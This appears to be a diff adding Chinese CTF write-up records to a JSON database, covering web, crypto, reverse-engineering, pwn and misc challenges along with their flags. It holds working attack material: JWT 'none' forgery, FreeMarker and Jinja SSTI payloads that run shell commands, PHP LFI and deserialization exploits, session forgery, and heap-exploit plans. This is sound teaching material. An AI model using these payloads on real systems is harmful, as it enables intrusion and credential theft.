+      "content": "## 题目描述\n\n一个私密信息存储的Web应用，需要绕过多层安全机制获取管理员存储的秘密。\n\n## 主要考点\n\n### 1. JWT伪造\n应用使用JWT进行认证，但存在算法混淆漏洞（none算法或弱密钥）。\n\n### 2. MongoDB NoSQL注入\n后端使用MongoDB，存在NoSQL注入漏洞（`$regex`, `$ne`操作符）。\n\n### 3. 加密分析\n存储内容使用AES加密，需要获取密钥才能解密。\n\n## 利用链\n\n```python\nimport requests\nimport jwt\n\nurl = \"http://target/\"\n# Step 1: JWT none算法攻击\ntoken = jwt.encode({\"user\": \"admin\", \"role\": \"admin\"}, \"\", algorithm=\"none\")\nheaders = {\"Authorization\": f\"Bearer {token}\"}\n\n# Step 2: NoSQL注入枚举加密密钥\nr = requests.post(f\"{url}/api/search\", \n    json={\"$regex\": \"^ISCC\"}, \n    headers=headers)\n```",
+      "flag": null,
+      "tags": [
+        "WEB",
+        "JWT",
+        "MongoDB",
+        "NoSQL注入",
+        "AES",
+        "算法混淆"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2yp14jmq",
+      "competitionId": "mskjft2yxsyf37",
+      "title": "强网杯S9-bbjv(WEB)",
+      "type": "WEB",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\nJava Web应用安全题目。\n\n## 核心漏洞\n\n### SSTI (服务器端模板注入)\n应用使用FreeMarker模板引擎，存在模板注入漏洞：\n\n```java\n// 漏洞代码\nString template = request.getParameter(\"template\");\nTemplate t = new Template(\"temp\", new StringReader(template), config);\nStringWriter out = new StringWriter();\nt.process(data, out);\n```\n\n### 利用方法\n\n```\nPOST /render HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\ntemplate=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /flag\")}\n```\n\n## 绕过沙箱\n\nFreeMarker 2.3.x默认禁用了ObjectConstructor，需要找到绕过方法：\n- 利用JythonRuntime\n- 利用ClassLoader加载恶意类\n- 利用内置的BeansWrapper\n\n```\n<#assign classLoader=object?class.protectionDomain.classLoader>\n<#assign clazz=classLoader.loadClass(\"java.lang.Runtime\")>\n<#assign method=clazz.getMethod(\"getRuntime\")>\n<#assign runtime=method.invoke(null)>\n<#assign exec=clazz.getMethod(\"exec\",String)>\n<#assign result=exec.invoke(runtime,\"cat /flag\")>\n```",
+      "flag": null,
+      "tags": [
+        "WEB",
+        "Java",
+        "SSTI",
+        "FreeMarker",
+        "沙箱绕过",
+        "模板注入"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2y1wj7cg",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "御网杯2026-幻影(MISC)",
+      "type": "MISC",
+      "difficulty": "简单",
+      "content": "## 题目描述\n\n一个数据恢复和编码分析的MISC题。\n\n## 解题步骤\n\n1. data.bin → base64解密\n2. 使用 0xc1 进行逐字节XOR解密\n3. 解密后得到flag\n\n```python\nimport base64\n\nwith open(\"data.bin\", \"rb\") as f:\n    data = f.read()\n\n# Step 1: Base64 decode\ndecoded = base64.b64decode(data)\n\n# Step 2: XOR with 0xc1\nflag = bytes([b ^ 0xc1 for b in decoded])\nprint(flag.decode())\n```",
+      "flag": null,
+      "tags": [
+        "MISC",
+        "base64",
+        "XOR",
+        "数据恢复"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2ykonpq1",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "御网杯2026-签到题-损坏的压缩包(MISC)",
+      "type": "MISC",
+      "difficulty": "简单",
+      "content": "## 题目描述\n\n一个\"损坏的\"压缩包题目。\n\n## 解题步骤\n\n1. 打开data.txt文件\n2. 发现的base64编码数据\n3. 解码即可获得flag\n\n```python\nimport base64\n\nwith open(\"data.txt\", \"r\") as f:\n    data = f.read()\n\nflag = base64.b64decode(data).decode()\nprint(flag)\n```",
+      "flag": null,
+      "tags": [
+        "MISC",
+        "base64",
+        "签到"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2ypb4cg2",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "御网杯2026-BabyRSA(CRYPTO)",
+      "type": "密码学",
+      "difficulty": "简单",
+      "content": "## 题目描述\n\n一道RSA基础题目，e=3且明文很小。\n\n## 解题思路\n\n当 e=3 且 m^3 < n 时，可以直接对密文开立方根得到明文：\n\n```python\nfrom Crypto.Util.number import long_to_bytes\nfrom gmpy2 import iroot\n\nn = ...\ne = 3\nc = ...\n\n# 直接开三次方\nm, exact = iroot(c, e)\nif exact:\n    flag = long_to_bytes(int(m))\n    print(flag.decode())\n\n# flag{07f7b9e5cd7961b237aa0eed1b317aa8}\n```",
+      "flag": null,
+      "tags": [
+        "密码学",
+        "RSA",
+        "小指数攻击",
+        "开立方根"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2y8twd3s",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "御网杯2026-ScatterRSA(CRYPTO)",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\nHastad Broadcast Attack的线性填充变体版本。\n\n## 题目分析\n\n三组密文：`c_i = (a_i * m + b_i)^3 mod n_i`\n\n与标准Hastad攻击不同，这里明文经过了线性变换 `a_i * m + b_i`。\n\n## 解题思路\n\n1. 使用中国剩余定理(CRT)合并三组同余方程\n2. 利用一元Coppersmith小根法求解m\n\n```python\nfrom sage.all import *\n\n# 三组参数\nn1, a1, b1, c1 = ...\nn2, a2, b2, c2 = ...\nn3, a3, b3, c3 = ...\n\n# CRT合并\nN = n1 * n2 * n3\n# 构造关于m的多项式\nP.<x> = PolynomialRing(Zmod(N))\nf = (a1*x + b1)^3 - c1  # 利用CRT组合\n\n# Coppersmith\nroots = f.small_roots(X=2^400, beta=1.0)\nm = roots[0]\nprint(long_to_bytes(int(m)))\n\n# flag{daae034a444159b8d3a0be007da01a5e}\n```",
+      "flag": null,
+      "tags": [
+        "密码学",
+        "RSA",
+        "Hastad攻击",
+        "CRT",
+        "Coppersmith",
+        "线性填充"
+      ],
+      "createdAt": "2026-08-08T15:38:09.274Z",
+      "updatedAt": "2026-08-08T15:38:09.274Z"
+    },
+    {
+      "id": "mskjft2ze7yoqd",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "御网杯2026-ECDSA nonce重用(CRYPTO)",
+      "type": "密码学",
+      "difficulty": "中等",
+      "content": "## 题目描述\n\nECDSA签名中nonce(k值)被重用，可以恢复私钥。\n\n## 漏洞原理\n\n当两条ECDSA签名使用相同的k值(nonce)时：\n- r1 = r2 (因为r = k*G的x坐标)\n- s1 = k^(-1) * (h1 + r*d) mod n\n- s2 = k^(-1) * (h2 + r*d) mod n\n\n联立方程可求解：\n- `k = (h1 - h2) * (s1 - s2)^(-1) mod n`\n- `d = (s1*k - h1) * r^(-1) mod n`\n\n## 解题脚本\n\n```python\nfrom Crypto.Util.number import inverse, long_to_bytes\nfrom ecdsa import VerifyingKey, SECP256k1\n\n# 获取两条相同r的签名\nr1, s1, h1 = ...\nr2, s2, h2 = ...\nassert r1 == r2\n\nn = SECP256k1.order\n\n# 恢复k\nk = ((h1 - h2) * inverse(s1 - s2, n)) % n\n\n# 恢复私钥d\nd = ((s1 * k - h1) * inverse(r1, n)) % n\nprint(f\"私钥: {hex(d)}\")\n\n# flag{ecdsa_nonce_reuse_23c559c4d212862cf3cb29c2bc4bc1b1}\n```",
+      "flag": null,
+      "tags": [
+        "密码学",
+        "ECDSA",
+        "nonce重用",
+        "私钥恢复",
+        "椭圆曲线"
+      ],
+      "createdAt": "2026-08-08T15:38:09.275Z",
+      "updatedAt": "2026-08-08T15:38:09.275Z"
+    },
+    {
+      "id": "mskjg0tdpnviop",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "CrackMe_1_3.apk",
+      "type": "逆向",
+      "difficulty": "中等",
+      "content": "# CrackMe_1_3.apk\n\n## 文件格式分析\n拿到题目，是个apk文件，用JEB定位主函数MainActivity，发现校验逻辑是藏在native层的libmyapplication.so库。这里基本是干扰项。\n\nabc函数基本是干扰项。只有 `this.binding.btnVerify.setOnClickListener((View v) -> this.a(v));` 是真正的校验。\n\n## IDA静态分析\n解压apk文件，提取so库，然后拖入IDA中静态分析。\n\n导出表里能看到：\n- `Java_com_cr_myapplication_MainActivity_stringFromJNI`（@0x24a00）—— 反编译发现只是返回 \"Hello from C++\"，干扰项。\n- `JNI_OnLoad`（@0x24f80）—— 真正入口。\n\n跟进 JNI_OnLoad → 调 sub_25070：读 off_57214 这个 JNINativeMethod[3]（每项 3 个指针）：\n\n| name | signature | fnPtr |\n|---|---|---|\n| a | ([B)[B | 0x25110 |\n| b | ([B)[B | 0x25250 |\n| c | (Ljava/lang/String;)Z | 0x25390 |\n\n签名 (Ljava/lang/String;)Z（String→boolean）的 c 就是校验函数。\n\n## 校验函数逻辑\n- `sub_27590` 是 bytes→hex：查表 byte_F371 = \"0123456789abcdef\"（小写），每字节 push_back(table[b>>4]); push_back(table[b&0xF])。\n- `sub_27760` 是字符串比较。\n- 目标是个 `std::array<std::string,8>`，地址 0x5A1CC。\n\n## 核心变换 ChaCha20\n`sub_257A0`：典型的 64 字节分块、计数器逐块自增的流密码。再看 keystream 生成器 `sub_26D20`：quarter-round `sub_27200` 旋转量 16 / 12 / 8 / 7，字读写 `sub_271C0`/`sub_27310` 为小端。\n\n→ 这就是标准 ChaCha20（RFC 8439），唯一\"非标\"是块计数器从 1 开始（不是 0）。\n\n## 解密\n校验逻辑：`hex(ChaCha20_XOR(flag)) == target_hex`。由于 XOR 流密码自反（同 key/nonce/counter），所以：\n`flag = ChaCha20_keystream(counter=1) XOR unhex(target_hex)`\n\n**flag{b527e2621131134ec22251cfbca75e8c9f5ae4f41371871fd55911927f66a1b4}**",
+      "flag": null,
+      "tags": [
+        "Android",
+        "JNI",
+        "Native",
+        "ChaCha20",
+        "流密码",
+        "IDA"
+      ],
+      "createdAt": "2026-08-08T15:38:19.297Z",
+      "updatedAt": "2026-08-08T15:38:19.297Z"
+    },
+    {
+      "id": "mskjg0tdx8grsv",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "CrackMe_2_2.apk",
+      "type": "逆向",
+      "difficulty": "中等",
+      "content": "# CrackMe_2_2.apk\n\n## 文件格式分析\n拿到题目，apk框架。扔JEB里面找到主函数进行反编译。\n\nnative 方法在整个 MainActivity 里从未被调用。onCreate 只调了 `b()`。所有真正的逻辑都集中在 `b()` 方法里。\n\n## b() 在做什么？ —— 动态加载 dex\n结论：真正的输入框、校验按钮、校验逻辑全部都在 `classes3.dex` 里的 `com.cr.test.wide` 类中。\n\n## 校验逻辑定位\nJEB里面的classes3.dex函数。发现校验最终落在 libcrackme2.so 的 `Java_com_cr_crackme2_MainActivity_verifyFlag` 层。\n\n## 调试so库\n解压apk文件IDA调试so库，定位校验函数。\n\n看懂 verifyFlag（0x240f0）逐个看子函数：\n\n① `sub_24440` = PKCS#7 填充（块大小 8）：注意：当 len 已是 8 的倍数时，pad = 8，会补满一整块 8 个0x08（标准 PKCS#7 行为）。\n\n② `des_ecb_encrypt`：把 ptr 用 key \"12345678\" 做 DES-ECB，输出到 ptr_1。\n\n③ `bytesToHex`（bytesToHex(unsigned char*, int)，返回 std::string）：标准 bytes→hex。注意 verifyFlag 的反编译里把长度参数显示丢了，但实际调用是 bytesToHex(sret=v10, data=ptr, len)，hex 的对象是 ptr（填充后的明文），不是 ptr_1（DES 密文）。\n\n④ `sub_24510`：std::string 比较。\n\n## 关键陷阱：DES 是幌子\nptr_1（DES 密文）算出来后直接被 free，全程没参与任何比较。也就是说 \"12345678\" + DES 是纯干扰（red herring）。真正的判定是：**hex(PKCS7_pad(flag)) == 目标串**。\n\n## 解题\n直接对目标 hex 解码，再剥掉 PKCS#7 填充即可。\n\n**flag{HNCTF62RDYNTFMZ1TF}**",
+      "flag": null,
+      "tags": [
+        "Android",
+        "JNI",
+        "DES",
+        "PKCS7",
+        "动态加载dex",
+        "IDA"
+      ],
+      "createdAt": "2026-08-08T15:38:19.297Z",
+      "updatedAt": "2026-08-08T15:38:19.297Z"
+    },
+    {
+      "id": "mskjg0td5qj4dr",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "py_obf_10.pyc",
+      "type": "逆向",
+      "difficulty": "简单",
+      "content": "# py_obf_10.pyc\n\n## 文件格式分析\n拿到题目，发现是个pyc文件。使用pycds工具将他转成汇编语言。\n\n## pyc反汇编\n用VSCode打开，发现有些部分字符串乱码。直接丢给AI让它帮我们修复。\n\n## 还原py代码\n还原成py代码就是逻辑超级简单，一遍过的逆向题目。\n\n## flag解密\n直接解密即可。\n\n**flag{ddvo0ing-xv38-rr8e-3i27-vyhlqsb08llv}**",
+      "flag": null,
+      "tags": [
+        "Python",
+        "pyc",
+        "字节码逆向",
+        "pycds"
+      ],
+      "createdAt": "2026-08-08T15:38:19.297Z",
+      "updatedAt": "2026-08-08T15:38:19.297Z"
+    },
+    {
+      "id": "mskjg0ted4d3l5",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "rerere.exe",
+      "type": "逆向",
+      "difficulty": "简单",
+      "content": "# rerere.exe\n\n## 查壳\nPE 文件，查壳。无壳。\n\n| 项 | 值 |\n|---|---|\n| 文件 | rerere.exe |\n| 架构 | x86-64 PE (image base 0x140000000) |\n| 编译器 | GCC (GNU) 15.1.0 / MinGW-w64 |\n| MD5 | 2b493f3ccbf3db74e21fa4f4ba8ec33b |\n| SHA-256 | a3475477f494e2066aad95c1b42e823d1d81d21aa6fce07cc3da2cf032b0f4bb |\n\n## IDA静态分析\n对字符串 \"Input: \"（0x140004000）做交叉引用，落在 sub_1400014FB（即 main）：flag 长度固定 38，由 sub_140001480 校验。\n\n## 加密逻辑\n`sbox[ input[i] ^ key[i & 7] ] == target[i]` (i = 0..37)\n\n## 解密\nS盒替换逆向，根据target反推input。\n\n**flag{1470e2b8be617231cef8d657f4a1cba2}**",
+      "flag": null,
+      "tags": [
+        "Windows",
+        "PE",
+        "S盒",
+        "x86-64",
+        "MinGW",
+        "IDA"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0tepax4h0",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "OA System Portal",
+      "type": "WEB",
+      "difficulty": "简单",
+      "content": "# OA System Portal\n\n## 漏洞概述\n这是一个 PHP 文件包含题，核心代码可通过 `php://filter` 读出：\n\n```php\nmodule = isset($_GET['module']) ? $_GET['module'] : 'public_notices.php';\nmodule = str_replace('../', '', module);\ninclude(module);\n```\n\n程序只过滤了 `../`，没有禁止绝对路径和 PHP stream wrapper，因此可以读取源码并进一步尝试包含敏感文件。\n\n## 利用步骤\n1. 先使用 `php://filter` 读取 index.php 源码。\n2. 源码确认 `include(module)` 可直接包含用户传入路径后，尝试常见 flag 路径，`/flag.txt` 命中。\n\n## flag\n**flag{486494bb06932e628c595d285df9eae9}**",
+      "flag": null,
+      "tags": [
+        "PHP",
+        "文件包含",
+        "LFI",
+        "php://filter",
+        "路径穿越"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0teipr9xn",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "WEB-PHP_Payment",
+      "type": "WEB",
+      "difficulty": "中等",
+      "content": "# WEB-PHP_Payment\n\n## 漏洞概述\n分析优惠券接口时发现用户可控数据被直接反序列化。\n\n继续查看 `tmp/ctf_src/src/models.php:12`，发现 `PromoManager` 的析构函数会在请求结束时把 `promo_credit` 加入当前 session 余额。\n\n`tmp/ctf_src/src/buy.php:34` 中购买 flag 需要 99999 金币，初始余额只有 20。因此只要伪造一个 `PromoManager` 对象，并把 `promo_credit` 设置成足够大的数字，就可以在请求结束时自动给当前 session 加钱。\n\n## 利用步骤\n1. 需要注意余额存在 `$_SESSION['balance']` 里，所以领取优惠券和购买 flag 必须使用同一个 PHPSESSID。\n2. 构造序列化对象，Base64编码。\n3. 先访问首页获取自己的 PHPSESSID。\n4. 用同一个 session 调用 apply_coupon.php，虽然只返回 \"Coupon processed.\"，但请求结束时析构函数会执行，把余额写入 session。\n5. 用同一个 session 调用 /buy.php 购买 flag。\n\n**flag{4eab66d7fffeba5ede642960f36c0100}**",
+      "flag": null,
+      "tags": [
+        "PHP",
+        "反序列化",
+        "析构函数",
+        "Session",
+        "业务逻辑"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0te34p25n",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "WEB-Snake_Game",
+      "type": "WEB",
+      "difficulty": "简单",
+      "content": "# WEB-Snake_Game\n\n## 漏洞概述\n进入游戏后开启 Burp Suite 抓包，观察提交分数的请求。\n\n题目校验点在分数参数上，服务端会根据提交的分数判断是否回显 flag。\n\n## 利用步骤\n1. 直接在 Burp Suite 中修改数据包，把提交分数改成大于 300 的数值。\n2. 放行修改后的请求，页面返回 flag。\n\n该题为典型的前端校验绕过，分数验证完全在服务端但未做完整性校验。",
+      "flag": null,
+      "tags": [
+        "前端校验",
+        "Burp Suite",
+        "参数篡改",
+        "游戏题"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0teg889k5",
+      "competitionId": "mskjft2ywccf9e",
+      "title": "WEB-TaxSystem_SSTI",
+      "type": "WEB",
+      "difficulty": "中等",
+      "content": "# WEB-TaxSystem_SSTI\n\n## 源码分析\n- `ctf_vam/SRC/init_db.py:36` 写死了账号密码：`admin / 123456`\n- `ctf_vam/SRC/app.py:53` 的 `/api/import` 允许当前用户更新 state、custom_footer 等字段，但没有做状态流转校验。\n- `ctf_vam/SRC/app.py:79` 中，只要 profile 的 state == AUDIT_PENDING，就会把 custom_footer 直接拼进 template_html，再交给 render_template_string() 渲染，形成 SSTI。\n\n## 防护与绕过\n黑名单拦截了 `__`、`.`、引号、request、session、system 等字符串，但 `{{config}}` 不在黑名单中，并且 Flask 模板上下文默认可以访问 config。\n\n`ctf_vam/SRC/app.py:160` 的 `/admin/vault` 只检查 `session['role'] == 'tax_inspector'`。因此拿到真实 SECRET_KEY 后，即可伪造 Flask session 访问后台金库。\n\n## 利用步骤\n1. 先用源码中的账号登录：`admin / 123456`\n2. 调用 `/api/create_profile` 创建自己的档案。\n3. 调用 `/api/import`，把该 profile 改成待审计状态并写入 SSTI payload：`{ state: 'AUDIT_PENDING', custom_footer: '{{config}}' }`\n4. 访问 `/preview/<profile_id>`，页面回显 Flask 配置，获取远端真实 SECRET_KEY：`secret_tax_key_2026_xoxo`\n5. 注意远端真实 key 和本地默认 key 不一样，不能直接使用源码默认值伪造。用获取到的 SECRET_KEY 伪造 session `role=tax_inspector`，访问 `/admin/vault` 获取最终 flag。",
+      "flag": null,
+      "tags": [
+        "Flask",
+        "SSTI",
+        "Jinja2",
+        "Session伪造",
+        "SECRET_KEY",
+        "Python"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0tedy6ega",
+      "competitionId": "mskjg0t7paw62s",
+      "title": "chat_with_me",
+      "type": "PWN",
+      "difficulty": "困难",
+      "content": "# chat_with_me\n\n## 漏洞分析\n程序存在任意地址 free，并且可以泄漏堆、栈信息。\n\n## 利用思路\n1. 通过申请大量 message 可以将存储 message 数组的 chunk 大于 0x410。\n2. 利用任意地址 free 掉 message 数组，这样 message 数组头就会携带上 libc 信息，因此可以通过使用 show 功能泄漏 libc 地址。\n3. 利用任意地址 free 在 IO 缓冲区处构造 tcache hijacking：\n   - 首先在IO 缓冲区构造 size 为 0x31 的 chunk，并将其 free 掉。\n   - 随后修改该 chunk 的 size 为 0x101 同时劫持 tcache->next。\n   - 下次输入的时候将该 chunk 拿出，随后其会被释放到 0x101 的 tcache 中。\n   - 此时 0x31 的 tcache 即为我们劫持的地址，最后一次输入的时候构造 ROP 链即可。\n\n## 注意事项\n远程环境和本地环境堆布局略有差异，需要使用一些侧信道的方法泄漏出其对应的偏移，比如根据堆的布局进行 chunk 进行 free，观测程序是否崩溃。\n\n## 关键代码\n```python\n#!/usr/bin/env python3\nfrom pwn import *\ncontext.clear(arch='amd64', os='linux', log_level='debug')\nsh = remote('47.93.15.136', 34850)\n# ...\n# 利用任意地址free在IO缓冲区构造tcache hijacking\n# 最终用ROP链执行 system(\"/bin/sh\")\n```",
+      "flag": null,
+      "tags": [
+        "Heap",
+        "tcache",
+        "hijacking",
+        "任意地址free",
+        "ROP",
+        "libc泄漏"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0telc5zk1",
+      "competitionId": "mskjg0t7paw62s",
+      "title": "prpr",
+      "type": "PWN",
+      "difficulty": "困难",
+      "content": "# prpr\n\n## 漏洞概述\n通过注册一系列printf处理函数来实现了一个虚拟机。\n\n虚拟机指令片段在0x3140处，共250条指令。功能有6个：\n1. 输入数据到 `global->memory[mem_idx]`，并与一个 char 数据进行与运算\n2. 依次输入数据，并与一个 int 数据进行与运算\n3. 异或运算（类似功能1）\n4. 依次异或（类似功能2）\n5. 或运算（类似功能1）\n6. 依次或运算（类似功能2）\n\n## 漏洞点\n`mem_and`、`mem_xor`、`mem_or` 这三个函数循环的终止条件不正确。如果字符串没有被 `\\0` 截断，则循环将继续进行，进而覆盖后面的数据。memory结构体数据区大小为0x100，继续向下可以覆盖 `return_addr`，在返回时会用到，即有机会控制pc指针。\n\n## 利用思路\n1. 先调用功能4（依次异或）把memory的buf填满（因为内存偏移问题）。\n2. 然后调用功能3触发循环未截断的漏洞去覆盖return_addr为50（call 60地址）。\n3. 上下文r5为0x40，通过`call 60`函数中的`push getint()`可以实现pc任意可控。\n4. 将pc偏移指向可控区，伪造一系列虚拟机指令结构体：\n   - 先泄漏堆地址和ELF地址\n   - 读入第二阶段虚拟机指令（因为大小不够，分段读入执行）\n5. 第二阶段：通过改写 `regs` 指针并结合 `push_r` 实现任意地址读，泄漏environ得到栈地址。\n6. 第三阶段：利用 `pop_r` 进行任意地址写改写栈，`pop rsp; ret` 到ROP中执行。\n\n## 技术要点\n- glibc 2.39环境\n- 通过虚拟机指令结构体伪造实现漏洞利用\n- 三段式利用：信息泄漏 → 任意地址读 → 任意地址写 → ROP",
+      "flag": null,
+      "tags": [
+        "VM Escape",
+        "printf",
+        "虚拟机",
+        "ROP",
+        "glibc 2.39",
+        "任意地址读写"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0tedr5bad",
+      "competitionId": "mskjg0td4uhh8k",
+      "title": "谍影重重 6.0",
+      "type": "MISC",
+      "difficulty": "中等",
+      "content": "# 谍影重重 6.0\n\n## 题目概述\n一个流量分析题目，需要从pcap文件中提取音频数据并分析隐藏信息。\n\n## 流量分析\n- 观察data包头 `80007651995957c3884819ee` 这段数据，识别为RTP协议。\n- 使用 `tshark -r Data.pcap -T fields -e data > Data.txt` 将data全部提取出来。\n- 清理全空的0xff字符，减少数据量。\n\n## 音频转码\nRTP payload是G.711 μ-law编码的音频数据。使用查找表将8位的μ-law字节解码为16位的线性采样值：\n\n```python\n_ULAW_DECODE_TABLE = [ ... ]\ndef decode_ulaw_to_pcm16(ulaw_data):\n    pcm_frames = []\n    for ulaw_byte in ulaw_data:\n        pcm_sample = _ULAW_DECODE_TABLE[ulaw_byte]\n        pcm_frames.append(struct.pack('<h', pcm_sample))\n    return b''.join(pcm_frames)\n```\n\n参数配置：\n- CHANNELS = 1\n- SAMPWIDTH = 2 (16-bit)\n- FRAMERATE = 8000\n\n根据SSRC对RTP包进行分组，分别导出为WAV文件，并合并为完整音频。\n\n## 语音识别\n使用FunASR进行语音识别（本地部署速度快）。音频内容为AI生成的随机文本，但可疑点明显：\n\n发现一段数字序列：\n> 六 五 一 四 六 六 三 一 四 五 一 四 二 七 一 六 一 六 六 一 四 二 一 四 六 六 零 七 六 一 四 五 六 六 六 一 六 零 一 四 一 一 四 五 一 四 二 六 零 七 一 一 四 六 六 六 六 零 一 四 二 一 四 三 七 一 六 五 六 五 一 四 二 一 四 四 七 零\n\n转化为数字串：`651466314514271616614214660701456661601411451426071146666014214371656514214470`\n\n## 八进制解码\n范围是0-7，用动态规划算法切成若干个长度为 2 或 3 的八进制段寻找可能的解：\n\n```python\ns = \"651466314514271616614214660701456661601411451426071146666014214371656514214470\"\nfrom functools import lru_cache\n@lru_cache(None)\ndef dp(i):\n    if i == len(s): return [[]]\n    res = []\n    for l in (2, 3):\n        if i + l <= len(s):\n            part = s[i:i+l]\n            val = int(part, 8)\n            if 32 <= val <= 126:\n                for tail in dp(i + l):\n                    res.append([val] + tail)\n    return res\n```\n\n解码后得到压缩包密码，解压得到一段音频对话。\n\n## 社会工程学分析\n对话内容提到\"廿四\"（24日）、\"辰时正\"（8时）、\"三刻\"（45分）、\"双鲤湖西岸南山茶铺\"（福建金门），结合1949年10月24日金门战役：\n\n`1949年10月24日8时45分于双鲤湖西岸南山茶铺`\n\n取MD5后即为flag。",
+      "flag": null,
+      "tags": [
+        "流量分析",
+        "RTP",
+        "G.711",
+        "μ-law",
+        "语音识别",
+        "FunASR",
+        "八进制",
+        "动态规划",
+        "社工"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0telm3kgg",
+      "competitionId": "mskjg0td4uhh8k",
+      "title": "adventure",
+      "type": "PWN",
+      "difficulty": "困难",
+      "content": "# adventure\n\n## 题目概述\n一个文字冒险游戏题，含有多个命令（shop/skills/explore/upgrade/inv/stat/fight/battle/look/map/quest/move/search/rest/quit/exit/go/missions等）。\n\n## 漏洞发现\n1. **整数溢出漏洞**：在shop中购买商品时，计算价格使用有符号整数 `v17 = 数量 * 1 * 单价`，4号商品单价0x100、最大购买数量8500599，计算结果0x81b57800会溢出为负数，实现负数金币（实际是获得大量金币）。\n\n2. **堆漏洞**：击败Dragon's Peak的龙怪后获得魔戒，在inventory中查看魔戒description时存在漏洞：\n   - 输入0x40字节会覆盖魔戒结构体中的description指针 → **任意地址读**\n   - 写入新description时从同一指针写入 → **任意地址写**\n\n## 利用链\n1. 利用整数溢出购买大量炸弹（500000个即可击败龙怪）\n2. 击败龙怪获取魔戒，卖掉后再买回可再次使用\n3. 任意地址读泄漏加密后的堆地址（glibc 2.32+ 使用 `stored = real_ptr ^ (real_ptr >> 12)` 加密）\n4. 堆地址解密：当堆块相近时，`pos >> 12 == real_ptr >> 12`，可使用 `x = s ^ (s >> 12) ^ (s >> 24) ^ ...` 解密\n5. 泄漏栈地址，继而泄漏libc基址\n6. 控制返回地址做栈迁移到堆中，打ORW读flag\n\n## 沙盒\n白名单沙盒，只能使用open/read/write，需要打ORW链。\n\n## 关键代码\n```python\ndef calc_heap(addr):\n    s = hex(addr)[2:]\n    s = [int(x, base=16) for x in s]\n    res = s.copy()\n    for i in range(9):\n        res[3+i] ^= res[i]\n    res = \"\".join([hex(x)[2:] for x in res])\n    return int(res, 16)\n```",
+      "flag": null,
+      "tags": [
+        "游戏题",
+        "整数溢出",
+        "堆利用",
+        "任意地址读写",
+        "ORW",
+        "栈迁移",
+        "glibc 2.32+",
+        "safe-linking"
+      ],
+      "createdAt": "2026-08-08T15:38:19.298Z",
+      "updatedAt": "2026-08-08T15:38:19.298Z"
+    },
+    {
+      "id": "mskjg0te0qiecl",
+      "competitionId": "mskjg0td4uhh8k",
+      "title": "LegacyOLED",
+      "type": "MISC",
+      "difficulty": "中等",
+      "content": "# LegacyOLED\n\n## 题目概述\n一个硬件信号分析题，从逻辑分析仪捕捉的信号中还原OLED屏幕显示内容。\n\n## 信号识别\n- 双信号，大部分规律是只有在时钟低电平时数据才变化，高电平不变化 → 判断为I2C协议。\n- 用I2C解释器发现数据格式：开始信号 → 8位地址+读写 → ACK → 8位数据 → ACK。\n\n## 数据提取\n1. 从PulseView提取解码后的I2C数据（对第二行右键提取数据，第一行是bit）。\n2. 编写脚本清洗数据，提取SSD1306设备（地址0x3C）的数据事务。\n\n## SSD1306协议解析\n根据SSD1306 datasheet编写解析脚本：\n- 控制字节0x40表示数据写入模式\n- 支持三种寻址模式：Page/ Vertical/ Horizontal\n- 指令如：0xAF(Display ON)、0xA1(Horizontal Flip)、0xC8(Scan Reverse)、0xB0~0xB7(Set Page)、0x21(Set Column)、0x22(Set Page address)、0x8D(Charge pump)等\n\n```python\nimport numpy as np\nfrom PIL import Image\narr = np.zeros((64, 128, 3), dtype=np.uint8)\n# 解析I2C数据，按SSD1306协议逐帧渲染\nfor line in open(\"annotations\"):\n    if \"Data write\" in line:\n        # 提取数据\n    if \"Stop\" in line:\n        # 完成一帧，保存图片\n        image = Image.fromarray(arr)\n        image.save(f\"result-{j}.png\")\n```\n\n## Flag提取\n生成1000多张图片后，在第1090张左右发现特殊图片。使用zsteg检测发现隐藏数据，提取得到flag。",
+      "flag": null,
+      "tags": [
+        "I2C",
